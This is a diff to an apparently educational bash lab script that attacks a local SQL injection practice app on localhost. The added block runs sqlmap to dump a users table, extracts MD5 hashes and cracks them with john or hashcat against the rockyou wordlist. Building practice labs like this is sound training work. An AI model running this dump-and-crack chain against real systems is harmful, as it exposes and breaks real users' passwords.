@@ -4,7 +4,7 @@
 # Usage: bash lab_sqli_app.sh
 # =====================================================================
 set -uo pipefail
-source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)/env.sh"
+source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)/env.sh"
 
 APP="http://localhost:$SQLI_APP_PORT"
 
@@ -33,6 +33,21 @@ echo ""
 echo "--- sqlmap automatique ---"
 echo "[*] Lancement de sqlmap sur le point 1..."
 sqlmap -u "$APP/?page=search&id=1" --batch --dbms=sqlite --level=2 --tables 2>&1 | grep -E '^(|[\*].*|Database:)' | head -10
+
+echo ""
+echo "--- Cracking des hashs MD5 ---"
+HASHES=$(mktemp)
+sqlmap -u "$APP/?page=search&id=1" --batch --dbms=sqlite -T users --dump 2>/dev/null \
+  | grep -oP '[a-f0-9]{32}' > "$HASHES"
+if [ -s "$HASHES" ]; then
+  echo "[*] $HASHES contient $(wc -l < "$HASHES") hashs"
+  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt "$HASHES" 2>/dev/null \
+    && john --show --format=raw-md5 "$HASHES" 2>/dev/null \
+    || hashcat -m 0 -a 0 "$HASHES" /usr/share/wordlists/rockyou.txt --show 2>/dev/null
+else
+  echo "[!] Aucun hash extrait"
+fi
+rm -f "$HASHES"
 
 echo ""
 echo "[+] Fini. Tous les points d'injection sont exploitables."
